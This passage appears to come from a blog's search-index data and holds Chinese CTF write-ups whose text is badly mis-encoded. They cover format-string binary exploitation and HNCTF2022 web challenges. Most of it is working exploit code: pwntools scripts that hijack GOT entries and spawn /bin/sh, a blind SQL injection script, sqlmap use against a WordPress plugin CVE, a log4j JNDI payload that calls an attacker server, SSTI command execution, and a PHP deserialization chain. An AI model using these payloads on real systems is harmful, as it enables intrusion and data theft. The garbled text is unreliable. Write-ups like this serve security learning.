4å°†systemåœ°å€å†™å…¥printfæ‰€åœ¨gotè¡¨çš„ä½ç½®çš„å…·ä½“åšæ³•å°±æ˜¯ï¼Œåœ¨åç§»ä¸º7çš„ä½ç½®æ”¹ä½ä½ï¼Œåœ¨åç§»ä¸º11çš„ä½ç½®æ”¹é«˜ä½ å› ä¸ºæ— æ³•ç›´æ¥æ”¹ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆè¦é€šè¿‡è·³æ¿ï¼Œå°±æ˜¯æœ€å¼€å§‹mainé‚£ä¸ªè·³æ¿ æ”¹ä¸ºè¿™æ · #raw_input('&gt;')payload3 = &quot;%&quot; + str(step2 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload3)rc()payload4 = &quot;%&quot; + str((printf_got+2) &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload4)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break Step 5æœ€åå°±æ˜¯æ”¹printfåœ°å€ä¸ºsystemï¼Œå½“å†æ¬¡è°ƒç”¨printfå‡½æ•°çš„æ—¶å€™ï¼Œå°±ä¼šé€šè¿‡gotè¡¨æ‰¾åˆ°systemçš„åœ°å€ï¼Œç„¶åæ‰§è¡Œ payload payload5 = &quot;%&quot; + str(system_addr &amp; 0xffff) + &quot;c%7$hn&quot;payload5 += &quot;%&quot; + str((system_addr &gt;&gt; 16) - (system_addr &amp; 0xffff)) + &quot;c%11$hn&quot;sl(payload5)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break#raw_input('&gt;')sl(&quot;/bin/sh&quot;) expæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„ç‚¹ï¼Œæˆ‘å¿…é¡»è¦åŠ ä¸Šcontext.log_level = 'debug'æ‰èƒ½å¤Ÿæ‰“é€šï¼Œä¸ç„¶æœ€åé‚£ä¸ªwhileä¼šæŠ¥é”™â€¦. å¾ˆéš¾ç»·å¾—ä½ğŸ’¦ from pwn import *context.log_level = 'debug'elf = ELF('./playfmt')libc = ELF('/lib/i386-linux-gnu/libc.so.6')io = process('./playfmt')sl = lambda s : io.sendline(s)sd = lambda s : io.send(s)rv = lambda n : io.recv(n)rc = lambda : io.recv()ru = lambda s : io.recvuntil(s)def ms(name,addr): print(name + &quot;----&gt;&quot; + hex(addr))def debug(mallocr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print }}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(io,'b *{}'.format(hex(text_base+mallocr))) else: gdb.attach(io,&quot;b *{}&quot;.format(hex(mallocr)))printf_got = elf.got['printf']printf_off = libc.symbols['printf']system_libc = libc.symbols['system']paylaod = 'aaaa%6$p'sl(paylaod)ru(&quot;aaaa&quot;)ebp_content = int(rv(10), 16)ebp_base = ebp_content - 0x10step1 = ebp_content - 0xcstep2 = ebp_content + 0x4ms(&quot;ebp_content&quot;, ebp_content)ms(&quot;ebp_base&quot;, ebp_base)ms(&quot;ebp_content-0xc&quot;, step1)ms(&quot;main_offset&quot;, step2)payload1 = &quot;%&quot; + str(step1 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload1)#raw_input('&gt;')rc()payload2 = &quot;%&quot; + str(printf_got &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload2)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: break#raw_input('&gt;')payload3 = &quot;%&quot; + str(step2 &amp; 0xffff) + &quot;c%6$hn&quot;sl(payload3)rc()payload4 = &quot;%&quot; + str((printf_got+2) &amp; 0xffff) + &quot;c%10$hn&quot;sl(payload4)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: breakleak_printf = 'aaaa%7$s'sl(leak_printf)ru(&quot;aaaa&quot;)printf_addr = u32(rv(4))ms(&quot;printf_addr&quot;, printf_addr)system_addr = printf_addr - printf_off + system_libcms(&quot;system&quot;, system_addr)payload5 = &quot;%&quot; + str(system_addr &amp; 0xffff) + &quot;c%7$hn&quot;payload5 += &quot;%&quot; + str((system_addr &gt;&gt; 16) - (system_addr &amp; 0xffff)) + &quot;c%11$hn&quot;sl(payload5)rc()while 1: sd(&quot;lnk&quot;) sleep(0.1) data = rc() if data.find(&quot;lnk&quot;) != -1: breakraw_input('&gt;')sl(&quot;/bin/sh&quot;)io.interactive()","link":"/2022/02/12/fmt_bss/"},{"title":"Format String","text":"æ ¼å¼åŒ–å­—ç¬¦ä¸² æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åœ¨ç†ç”±æ—¶ä¸€èˆ¬åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ† æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•° æ ¼å¼åŒ–å­—ç¬¦ä¸² è¦è¾“å‡ºçš„å˜é‡ï¼ˆå¯é€‰ï¼‰ å…·ä½“åŸç†å¯å‚è€ƒCTF-WIKIï¼Œè¿™é‡Œä¸»è¦è®°å½•ä¸‹åšé¢˜çš„è¿‡ç¨‹ï¼ˆğŸ‘´åˆğŸ¥¬åˆæ‡’ğŸ¶ï¼Œå†™ä¸åŠ¨ğŸŒ¶ï¸ 2022-1-7æ›´æ–°ã€‚ã€‚ã€‚æ„Ÿè§‰è¿˜æ˜¯æœ‰äº›ç‚¹é—®é¢˜ï¼Œæ¯”å¦‚å†…å­˜å†™å…¥ä¸å¤ªæ¸…æ™°ï¼Œè¿˜æ˜¯å†™ä¸‹ç¬”è®°ï¼Œè¿™é‡Œä¸»è¦æ˜¯32ä½ä¸‹çš„ç¨‹åº æ³„æ¼å†…å­˜æ•°æ® æ³„æ¼æ ˆä¸Šå†…å®¹ 32ä½ï¼š %n$x (returnæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°å€¼)64ä½ï¼š %n$p (returnæ ˆä¸Šç¬¬n-5ä¸ªå‚æ•°å€¼)ï¼ˆ64ä½ä¸‹ä¼˜å…ˆå¯„å­˜å™¨ä¼ å‚ æ³„æ¼å†…å­˜åœ°å€çš„å†…å®¹ 32ä½ï¼š %n$sï¼šæŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œè¿”å›è¯¥åœ°å€å†…å­˜çš„å€¼64ä½ï¼š %n$sï¼šæŠŠæ ˆä¸Šç¬¬n-5ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œè¿”å›è¯¥åœ°å€å†…å­˜çš„å€¼ è¦†å†™å†…å­˜æ•°æ® å½¢å¼å’Œæ³„æ¼ç±»ä¼¼ï¼Œå°†$sæ”¹ä¸º$n ç”¨%xcæ§åˆ¶å†™å…¥å­—ç¬¦æ•° %***c%n$nï¼š æŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œå°†è¯¥åœ°å€çš„é«˜32bitå€¼æ”¹ä¸º hex(***)%***c%n$hnï¼š æŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œå°†è¯¥åœ°å€çš„é«˜16bitå€¼æ”¹ä¸º hex(***)%***c%n$hhnï¼šæŠŠæ ˆä¸Šç¬¬n+1ä¸ªå‚æ•°çš„å€¼ä½œä¸ºåœ°å€ï¼Œå°†è¯¥åœ°å€çš„é«˜8bitå€¼æ”¹ä¸º hex(***)hhä¸€ä¸ªå­—èŠ‚ï¼ŒhåŒå­—èŠ‚ ä¾‹å¦‚ #include&lt;stdio.h&gt;int main(void){ int x = 3; int* p; p = &amp;x; printf(&quot;0x12345678%n\\n&quot;, p); printf(&quot;x = %d\\n&quot;, x); return 0;} è¿™æ ·xçš„å€¼å°±ä¼šè¢«ä¿®æ”¹ä¸º10 ä¾‹é¢˜ï¼š[Jarvis OJ]fmè¿™é¢˜é€»è¾‘æŒºç®€å•ï¼Œxåˆå§‹åŒ–ä¸º3ï¼Œå½“ä¿®æ”¹x=4æ—¶å°±å¯ä»¥è¯»å‡ºflagï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¦åˆ©ç”¨format stringå°†xå¯¹åº”å†…å­˜åœ°å€å¤„çš„å€¼æ”¹ä¸º4 ç„¶ååç§»çš„è¯ï¼Œåˆ©ç”¨pwngdbçš„æ’ä»¶fmtargç®—å‡ºæ˜¯11 printf(x_address+&quot;%c$n&quot;)å¯ä»¥ä¿®æ”¹[x_address]çš„å€¼ä¸ºx_addressçš„å­—ç¬¦é•¿åº¦è¿™é‡Œå¾ˆå·§çš„ä¸€ç‚¹å°±æ˜¯p32(x_addr)çš„é•¿åº¦åˆšå¥½æ˜¯4ä¸ªå­—èŠ‚ exp from pwn import *io = remote('pwn2.jarvisoj.com' ,9895)x_addr = 0x0804A02Cpayload = p32(x_addr) + b&quot;%11$n&quot;io.sendline(payload)io.interactive() å®æ—¶æ•°æ®ç›‘æµ‹å¯ä»¥ç›´æ¥è¦†ç›–ï¼Œä¹Ÿå¯ä»¥åŒå­—èŠ‚è¦†ç›– exp from pwn import *io = remote('111.200.241.244', 54060)#io = process('./mon')context.log_level = 'debug'key_bss = 0x0804A048offset = 12#payload = fmtstr_payload(offset, {key_bss:0x02223322})payload = p32(key_bss+2) + p32(key_bss)payload += &quot;%&quot; + str(0x0222 - 8) + &quot;c%12$hn&quot;payload += &quot;%&quot; + str(0x3322 - 0x0222) + &quot;c%13$hn&quot;io.sendline(payload)io.interactive() inndy_echoå¯¼å…¥IDAä¸­å¯ä»¥çœ‹åˆ° do { fgets(&amp;s, 256, stdin); printf(&amp;s); } while ( strcmp(&amp;s, &quot;exit\\n&quot;) ); system(&quot;echo Goodbye&quot;); åœ¨printfå¤„å¯ä»¥åˆ©ç”¨ï¼Œå…ˆåœ¨gdbä¸­ç®—å‡ºåç§»æ˜¯7ï¼Œç„¶åæˆ‘ä»¬çœ‹åˆ°æœ‰systemå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨GOT HiJackå°†printf@gotçš„å†…å®¹æ”¹å†™æˆsystem@pltçš„åœ°å€,å†å†™å…¥/bin/sh\\x00æ‰§è¡Œ from pwn import *elf = ELF('echo')#io = process('./echo')io = remote('node4.buuoj.cn',26569)#context.terminal = ['tmux','splitw','-h']printf_got = elf.got['printf']system_plt = elf.plt['system']payload = fmtstr_payload(7,{printf_got:system_plt})io.sendline(payload)io.send('/bin/sh\\x00')io.interactive() wdb_2018_2nd_easyfmté¦–å…ˆæŸ¥çœ‹æ–‡ä»¶æ˜¯32ä½çš„åªå¼€äº†NXä¿æŠ¤ï¼Œç”¨idaæ‰“å¼€çœ‹ä¸‹ç¨‹åºé€»è¾‘ puts(&quot;Do you know repeater?&quot;); while ( 1 ) { read(0, &amp;buf, 0x64u); printf(&amp;buf); putchar(10); } çœ‹ä¸Šå»å°±æ˜¯å†™äº†ä¸ªæ­»å¾ªç¯ï¼Œé‡å¤è¾“å…¥è¾“å‡ºï¼Œä¸”printfå¤„å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦æ¼æ´ é¦–å…ˆæ‰¾åˆ°æ ¼å¼åŒ–å­—ç¬¦çš„åç§»ï¼Œç”¨fmtargå‘ç°æ˜¯The index of format argument : 7 (&quot;\\%6$p&quot;) é€šè¿‡printf@gotçš„åœ°å€leakå‡ºæˆ‘ä»¬æƒ³è¦çš„printf_addrï¼Œç„¶ååˆ©ç”¨libcç®—å‡ºsystem(å› ä¸ºè¿™é‡Œç¨‹åºæ²¡æœ‰è°ƒç”¨systemå‡½æ•°ï¼Œæˆ‘ä»¬åªèƒ½åœ¨libcä¸­æ‰¾) ç„¶åè¦†å†™printf@gotåœ°å€ä¸ºsystemçš„åœ°å€ï¼Œå†å‘é€æ‰§è¡Œ/bin/sh\\x00æ‹¿åˆ°shell printf_got = elf.got['printf']payload = p32(printf_got) + &quot;%6$s&quot;io.recvuntil(&quot;repeater?\\n&quot;)io.sendline(payload)io.recv(4) #å…ˆæ¥æ”¶print@gotçš„åœ°å€ï¼Œç„¶åæ‰æ˜¯æˆ‘ä»¬æƒ³è¦æ³„æ¼çš„printf_addr = u32(io.recv(4))print(hex(printf_addr)) ä¸‹é¢çº¢æ¡†é‡Œçš„æ‰æ˜¯æˆ‘ä»¬éœ€è¦çš„ï¼Œè“è‰²æ¡†æ˜¯printf@gotçš„åœ°å€ exp # coding=UTF-8from pwn import *#io = process('./eyfmt')io = remote('node4.buuoj.cn',28484)elf = ELF('./eyfmt')libc = ELF('./libc-2.23_32.so')context.log_level = 'debug'printf_got = elf.got['printf']payload = p32(printf_got) + &quot;%6$s&quot;io.recvuntil(&quot;repeater?\\n&quot;)io.sendline(payload)io.recv(4) #å…ˆæ¥æ”¶print@gotçš„åœ°å€ï¼Œç„¶åæ‰æ˜¯æˆ‘ä»¬æƒ³è¦æ³„æ¼çš„printf_addr = u32(io.recv(4))print(hex(printf_addr))'''å› ä¸ºè¿™é‡ŒLibcSearchä¸èƒ½ç”¨ï¼Œlibcæ–‡ä»¶åœ¨buuä¸Šä¸‹è½½libc = LibcSearch('printf', printf_addr)libc_base = printf_addr - libc.dump['printf']system = libc_base + libc.dump['system']'''libc_base = printf_addr - libc.symbols['printf']print(hex(libc_base))system = libc_base + libc.symbols['system']print(hex(system))payload1 = fmtstr_payload(6,{printf_got:system})io.sendline(payload1)io.send('/bin/sh\\x00')io.interactive() greeting-150æ”»é˜²ä¸–ç•Œçš„ä¸€é“é¢˜ç›®ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä»»æ„å†™ä»¥åŠ _do_global_dtors_aux_fini_array_entryå¾ªç¯åˆ©ç”¨ exp from pwn import *elf = ELF('./greeting')io = remote('111.200.241.244', 50819)fini_arr = 0x08049934main = 0x080485EDstrlen_got = 0x08049A54system_plt = 0x08048490payload = b'k' * 2 # 2payload += p32(strlen_got+2)payload += p32(fini_arr+2)payload += p32(strlen_got)payload += p32(fini_arr)#16pad_len = len(&quot;Nice to meet you, &quot;) #18payload += b&quot;%&quot; + str(0x0804 - 0x24) + &quot;c%12$hn%13$hn&quot;payload += b&quot;%&quot; + str(0x8490 - 0x0804) + &quot;c%14$hn&quot;payload += b&quot;%&quot; + str(0x85ED - 0x8490) + &quot;c%15$hn&quot;io.sendlineafter(&quot;Please tell me your name... &quot;, payload)io.recvuntil(&quot;Please tell me your name... &quot;)io.sendline('/bin/sh\\x00')io.interactive() [CISCN 2019è¥¿å—]PWN1è¿™é¢˜å’Œä¸Šé¢˜åŸºæœ¬ä¸Šä¸€æ ·çš„ï¼Œå¾ªç¯â•ä»»æ„è¦†ç›–åœ°å€ exp from pwn import *io = remote('1.14.71.254', 28030)elf = ELF('./ciscn_2019_sw_pwn1')main = 0x08048534fini_addr = 0x0804979Cprintf_got = elf.got['printf']system_plt = 0x080483d0payload = p32(printf_got + 2) + p32(fini_addr + 2) + p32(printf_got) + p32(fini_addr)payload += &quot;%&quot; + str(0x0804 - 16) + &quot;c%4$hn%5$hn&quot;payload += &quot;%&quot; + str(0x83d0 - 0x0804) + &quot;c%6$hn&quot;payload += &quot;%&quot; + str(0x8534 - 0x83d0) + &quot;c%7$hn&quot;io.sendlineafter('name?', payload)io.recvuntil(&quot;name?&quot;)io.sendline('/bin/sh\\x00')io.interactive() TODO.. å‚è€ƒhttps://cartermgj.github.io/2018/01/16/fsb_summary/ https://bbs.ichunqiu.com/thread-42943-1-1.html?from=bkyl https://blog.csdn.net/qq_42728977/article/details/102880186?spm=1001.2014.3001.5501 https://blog.csdn.net/seaaseesa/article/details/102985263?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164207018816780261995209%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164207018816780261995209&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-102985263.first_rank_v2_pc_rank_v29&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cgreeting-150&amp;spm=1018.2226.3001.4187","link":"/2021/12/12/fmt/"},{"title":"HNCTF2022 Webéƒ¨åˆ†WriteUp","text":"HNCTF2022 Webéƒ¨åˆ†é¢˜è§£è¿™é‡Œæˆ‘æ²¡æœ‰å…¨éƒ¨è®°å½•ï¼Œåªè®°å½•ä¸€äº›ä¸ªäººè§‰å¾—æœ‰æ„æ€çš„ç‚¹ã€‚ [Week1]Challenge__rceæºç  &lt;?phperror_reporting(0);if (isset($_GET['hint'])) { highlight_file(__FILE__);}if (isset($_POST['rce'])) { $rce = $_POST['rce']; if (strlen($rce) &lt;= 120) { if (is_string($rce)) { if (!preg_match(&quot;/[!@#%^&amp;*:'\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, $rce)) { eval($rce); } else { echo(&quot;Are you hack me?&quot;); } } else { echo &quot;I want string!&quot;; } } else { echo &quot;too long!&quot;; }} è¿™é¢˜è¿‡æ»¤çœŸçš„æŒºä¸¥æ ¼çš„ï¼ŒåŸºæœ¬ä¸Šä¹‹å‰çš„æ‰‹æ®µéƒ½è¢«banäº† &lt;?phpfor($a = 0; $a &lt; 256; $a++){ if (!preg_match(&quot;/[!@#%^&amp;*:'\\-&lt;?&gt;\\&quot;\\/|`a-zA-Z~\\\\\\\\]/&quot;, chr($a))){ echo urlencode(chr($a)).&quot; &quot;; }} ä¸»è¦çš„æ€è·¯å°±æ¥è‡ªpç‰›çš„æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡è¿˜æœ‰hint ctfshowåƒç“œæ¯shellme_revengeé‚£é¢˜ã€‚ ä½†æ˜¯ä»¿ç…§è¿™äº›å»æ„é€ _GETæ€»æ˜¯é•¿åº¦è¿‡é•¿ï¼Œè¿˜æœ‰å°±æ˜¯åƒç“œæ¯é‚£é¢˜ï¼Œï¼Œè¿™é¢˜\\ç¬¦å·æ˜¯ä¸èƒ½ç”¨çš„ æœ€åçš„è§£æ³•çš„è¯ï¼Œè¦åˆ©ç”¨chræ¥æ„é€ ï¼Œåˆ©ç”¨Arrayçš„aè‡ªå¢åˆ°chï¼Œç„¶åæ‹¼æ¥ä¸Šé‡Œé¢æœ‰çš„rï¼Œå†åˆ©ç”¨asciiç æ„é€ å‡º_GET &lt;?php$_=([].Â«){3};var_dump($_); //a$_++; //b$_.=++$_; //cc$_++; //cd$_++; //ce$_++; //cf$_++; //cg$_++; //ch$_.=([].Â«){2}; //chrvar_dump($_);$_=_.$_(71).$_(69).$_(84); // _GETvar_dump($_);($$_[0])($$_[1]); [WEEK2]ez_ssrfè¿™é¢˜â€¦æ„Ÿè§‰ä»£ç å†™çš„æœ‰ç‚¹é—®é¢˜ï¼Œè¯·æ±‚è¦å“åº”åŠå¤©æ‰æ˜¾ç¤º æœ‰æ—¶å€™è¿˜ç›´æ¥400 payload http://43.143.7.97:28957/index.php?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQpIb3N0OiAxMjcuMC4wLjEKQ29ubmVjdGlvbjogY2xvc2UK [WEEK2]easy_sqlç›²æ³¨+æ— åˆ—åæ³¨å…¥ é¦–å…ˆè¿™é‡Œç®€å•fuzzä¸€ä¸‹ï¼Œå‘ç°ä¸»è¦è¿‡æ»¤äº†information_schema ,#,and,ç©ºæ ¼ç­‰ã€‚ è¿‡æ»¤information_schemaçš„è¯ï¼Œå°±è€ƒè™‘ä¸‹é¢è¿™å››ä¸ªï¼Œä½†æ˜¯è¿™é¢˜åªæœ‰åˆ©ç”¨mysql.innodb_table_statså’Œmysql.innodb_index_stats mysqlæ³¨å…¥ç»•è¿‡information_schemaè¿‡æ»¤ æ³¨å…¥å‡ºåº“åå’Œè¡¨åï¼Œä¹‹ååªèƒ½é‡‡ç”¨æ— åˆ—åæ³¨å…¥ï¼Œpayloadå’Œ[SWPU2019]Web1é‚£é¢˜æ˜¯ç±»ä¼¼çš„ exp import requestsurl = 'http://43.143.7.97:28812/index.php'databases = 'ctf, ctftraining, mysql'# select = &quot;select/**/group_concat(database_name)/**/from/**/mysql.innodb_index_stats&quot;# select = &quot;select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name='ctftraining'&quot;tables = 'flag, news, users'select = &quot;select/**/group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select*from/**/ctftraining.flag)n&quot;flag = ''for i in range(10000): for s in range(32, 128): # payload = f&quot;2'or(if(ascii(substr(({select}),{i},1))={s},1,0))or'1'='2&quot; payload = f&quot;2'or(if(ascii(substr(({select}),{i},1))={s},1,0))or'1'='2&quot; res = requests.post(url=url, data={'id': payload}) # print(&quot;[*]Testing-&gt;&quot;, chr(s)) if 'Here is your want!' in res.text: flag += chr(s) print(flag) break [WEEK2]ohmywordpressè¿™ä¸€é¢˜æ˜¯ä¸ªwordpressï¼Œå®ƒæœ¬èº«æ˜¯æ²¡å•¥æ¼æ´çš„ï¼Œä¸»è¦æ˜¯ä¸€äº›æ’ä»¶çš„æ´ï¼Œä¸Šæ¬¡å¼ºç½‘æ¯ä¹Ÿæ˜¯ï¼Œè¿™é‡Œçš„è¯ï¼Œå¯ä»¥ç›´æ¥çœ‹æºç å‘ç°æœ‰ä¸¤ä¸ªæ’ä»¶ï¼Œæˆ–è€…ç›´æ¥wp-scanå¯ä»¥æ‰«å‡ºæ¥æœ‰ä¸ªæ’ä»¶ç‰ˆæœ¬æ˜¯æ²¡æ›´æ–°çš„ äºæ˜¯å°±ç›´æ¥è°·æ­Œæœï¼Œæœå‡ºæ¥CVE-2022-0760ï¼Œæœ‰åˆ©ç”¨payload å¯ä»¥çœ‹åˆ°æ˜¯å¯ä»¥æ—¶é—´ç›²æ³¨çš„ ç›´æ¥ä¸Šsqlmapäº† POST /wp-admin/admin-ajax.php HTTP/1.1Host: 43.143.7.97:28116User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://43.143.7.97:28116/wp-admin/admin-ajax.phpContent-Type: application/x-www-form-urlencodedContent-Length: 83Origin: http://43.143.7.97:28116Connection: closeUpgrade-Insecure-Requests: 1action=qcopd_upvote_action&amp;post_id=* sqlmap -r 1.txt --level 3sqlmap -r 1.txt --level 3 --dbs[*] ctftraining[*] information_schema[*] mysql[*] performance_schema[*] test[*] wordpresssqlmap -r 1.txt --level 3 --tables -D ctftraining+-------+| flag || news || users |+-------+sqlmap -r 1.txt --level 3 --dump -D ctftraining -T flag [WEEK3]logjjjjlogjjjjå°±æ˜¯log4jçš„æ¼æ´å¤ç°ï¼Œåˆ©ç”¨è¿™ä¸ª payload java -jar JNDIExploit-1.4-SNAPSHOT.jar -i vps -p 2333 ${jndi:ldap://vps:1389/TomcatBypass/TomcatEcho} //è¦urlç¼–ç ä¼ è¿‡å» å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ï¼Œä¹Ÿå¯ä»¥åå¼¹shell [WEEK3]sssstiæ¯”ä¹‹å‰é‚£é¢˜å¤šäº†è¿‡æ»¤ï¼Œå¼•å· ä¸‹åˆ’çº¿ï¼Œ çœ‹è¿™ä½å¸ˆå‚…å­¦åˆ°äº†ç”¨lipsum {{lipsum[request.values.a][request.values.b][request.values.c](request.values.d).popen(request.values.e).read()}}&amp;a=__globals__&amp;b=__builtins__&amp;c=__import__&amp;d=os&amp;e=ls / [WEEK4]popå­å’Œpipiç¾&lt;?phperror_reporting(0);//flag is in f14g.phpclass Popuko { private $No_893; public function POP_TEAM_EPIC(){ $WEBSITE = &quot;MANGA LIFE WIN&quot;; } public function __invoke(){ $this-&gt;append($this-&gt;No_893); } public function append($anti_takeshobo){ include($anti_takeshobo); }}class Pipimi{ public $pipi; public function PIPIPMI(){ $h = &quot;è¶…å–œæ¬¢POPå­ww,ä½ ä¹Ÿä¸€æ ·å¯¹å§(ä¸¾åˆ€)&quot;; } public function __construct(){ echo &quot;Pipiç¾æ°¸è¿œä¸ä¼šç”Ÿæ°”ww&quot;; $this-&gt;pipi = array(); } public function __get($corepop){ $function = $this-&gt;p; return $function(); }}class Goodsisters{ public function PopukoPipimi(){ $is = &quot;Good sisters&quot;; } public $kiminonawa,$str; public function __construct($file='index.php'){ $this-&gt;kiminonawa = $file; echo 'Welcome to HNCTF2022 ,'; echo 'This is '.$this-&gt;kiminonawa.&quot;&lt;br&gt;&quot;; } public function __toString(){ return $this-&gt;str-&gt;kiminonawa; } public function __wakeup(){ if(preg_match(&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\\.\\./i&quot;, $this-&gt;kiminonawa)) { echo &quot;ä»²è‰¯ãƒ”ãƒ¼ã‚¹!&quot;; $this-&gt;kiminonawa = &quot;index.php&quot;; } }}if(isset($_GET['pop'])) @unserialize($_GET['pop']);else{ $a=new Goodsisters; if(isset($_GET['pop_EP']) &amp;&amp; $_GET['pop_EP'] == &quot;ep683045&quot;){ highlight_file(__FILE__); echo 'æ¬¸å˜¿,ä½ ä¹Ÿå–œæ¬¢popå­~å¯¹å§ww'; }} è¿™é¢˜å¼€å¤´çš„å‚æ•°æœ‰ç‚¹é˜´é—´ï¼Œè¦ä¼ ç•ªå·ï¼Œå¼€å§‹æ²¡æ‡‚ï¼Œé—®äº†åˆ«äººæ‰çŸ¥é“â€¦ è¿™é‡Œä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä¸»è¦å°±æ˜¯æ‰§è¡Œé‚£ä¸ªincludeå‡½æ•°åŒ…å«å‡ºflagï¼Œç„¶åè¿‡æ»¤ç”¨ä¼ªåè®®å°±å¥½ã€‚ ä¸»è¦æ€è·¯å‘¢ï¼Œå°±æ˜¯é€šè¿‡invokeå»è°ƒç”¨appendæ‰§è¡Œincludeå‡½æ•°ï¼Œè€Œ__invoke()å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨æ—¶è§¦å‘, ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°Pipimiæœ‰ä¸ªgetæ–¹æ³•å¯ä»¥è§¦å‘ä»–ï¼Œè€Œ__get()ç±»ä¸­çš„å±æ€§ç§æœ‰æˆ–ä¸å­˜åœ¨è§¦å‘ï¼Œæ¥ç€æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„toStringæ–¹æ³•ï¼Œ é€šè¿‡å®ƒæŠŠä¸Šé¢çš„é“¾èµ·æ¥ã€‚ exp &lt;?phpclass Popuko{ private $No_893 = &quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;;}class Pipimi{ public $pipi;}class Goodsisters{ public $kiminonawa,$str;}$a = new Popuko();$b = new Pipimi();$b-&gt;p = $a;$c = new Goodsisters();$c-&gt;str = $b;$d = new Goodsisters();$d-&gt;kiminonawa = $c; echo urlencode(serialize($d)); [WEEK4]fun_sql&lt;?include &quot;mysql.php&quot;;include &quot;flag.php&quot;;if ( $_GET['uname'] != '' &amp;&amp; isset($_GET['uname'])) { $uname=$_GET['uname']; if(preg_match(&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\\||right|substr|replace|char|&amp;|\\\\\\$|0x|sleep|\\#/i&quot;,$uname)){ die('hacker'); } $sql=&quot;SELECT * FROM ccctttfff WHERE uname='$uname';&quot;; echo &quot;$sql&lt;br&gt;&quot;; mysqli_multi_query($db, $sql); $result = mysqli_store_result($db); $row = mysqli_fetch_row($result); echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; if (!$row) { die(&quot;something wrong&quot;); } else { print_r($row); echo $row['uname'].&quot;&lt;br&gt;&quot;; } if ($row[1] === $uname) { die($flag); }}highlight_file(__FILE__); **æœ‰ç‚¹åƒå †å æ³¨å…¥ï¼Œä½†æ˜¯è²Œä¼¼ä¸èƒ½å¤šè¯­å¥æ‰§è¡Œï¼Œåªèƒ½ç”¨unionæ¥æ³¨å…¥ã€‚** ç¡®å®æ˜¯å †å æ³¨å…¥ï¼Œçœ‹äº†å®˜æ–¹wpå¯ä»¥ç”¨insertæ¥æ³¨å…¥ é¦–å…ˆç”¨order byæ¥åˆ¤æ–­å‡º3åˆ—ï¼Œç„¶ååˆ©ç”¨load_fileæ¥è¯»flagï¼Œä½†æ˜¯flagå…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œä¸€ä¸‹å­æ²¡æƒ³å‡ºæ¥ï¼Œé—®äº†å…¶ä»–å¸ˆå‚…æ˜ç™½åˆ°äº†ç”¨concatè¿æ¥å­—ç¬¦ä¸²ã€‚ -1' union select 1,load_file(concat('/var/www/html/fla','g.php')),3--+ æ€»ç»“æœ‰äº›é¢˜ç›®è¿˜æ˜¯æŒºæœ‰æ„æ€çš„ï¼Œè‡³å°‘æˆ‘æ˜¯æ–°ç”Ÿçš„æ—¶å€™æ²¡è¿™ä¸ªæ°´å¹³QAQ","link":"/2022/10/29/hnctf2022/"},{"title":"Java_Sec_Code---å…¶ä»–æ¼æ´å®¡è®¡","text":"å‰è¨€æœ‰äº›æ¼æ´ç¯‡å¹…ä¸æ˜¯å¾ˆå¤§ï¼Œå°±æ•´åˆåˆ°ä¸€èµ·æ¥ è·¯å¾„ç©¿è¶Šå®¡è®¡ç›´æ¥çœ‹åˆ°ä»£ç 